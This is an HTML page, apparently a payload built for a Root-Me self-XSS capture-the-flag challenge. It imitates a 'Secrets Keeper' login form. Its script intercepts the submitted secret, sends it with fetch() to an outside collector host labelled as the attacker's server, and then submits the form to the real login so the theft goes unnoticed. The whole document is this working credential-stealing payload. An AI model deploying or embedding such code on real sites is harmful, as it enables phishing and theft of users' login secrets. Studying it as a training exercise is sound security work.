<!DOCTYPE html>
<html lang="en">
<head>
    <title>Self XSS DOM Secrets - Secrets Keeper</title>
    <meta charset="UTF-8">

    <!--- favicon -->
    <link rel="icon" type="image/png" href="/static/images/rootme.png"/>

    <!--- css -->
    <link rel="stylesheet" property="stylesheet" type="text/css" href="style.css" media="all">
</head>
<body>
<h1>Secrets Keeper</h1>

<div style="display: flex; margin: auto; text-align: center; justify-content: center;">
    <p>
        <a href="/login">Login</a> | <a href="/profile">Profile</a> | <a href="/report">Report</a>
    </p>
</div>

<hr class="mgb-2">
<div style="display: flex; margin: auto; text-align: center; justify-content: center;">
    <fieldset style="width: 50%">
        <legend>Login</legend>
        <form id="loginForm" method="POST" action="/login" onsubmit="stealSecret(event)">
            <label>Username</label><br>
            <input id="username" class="mgb-1" name="username"></input><br>
            <label>Secret</label><br>
            <input id="secret" class="mgb-1" name="secret"></input><br>
            <button class="mgb-1" type="submit">Login</button>
        </form>
    </fieldset>
</div>

<script>
    function stealSecret(event) {
        event.preventDefault(); // Prevent the form from submitting normally
        const secret = document.getElementById('secret').value;
        const url = `https://iamevil.free.beeceptor.com/?session=${encodeURIComponent(secret)}`;
        
        // Send the request to the malicious server
        fetch(url)
            .then(response => console.log('Secret sent to attacker:', response))
            .catch(error => console.error('Error sending secret:', error));

        // Optionally, you can still submit the form to the original action
        // Uncomment the following line if needed
        event.target.submit();
    }
</script>
</body>
</html>
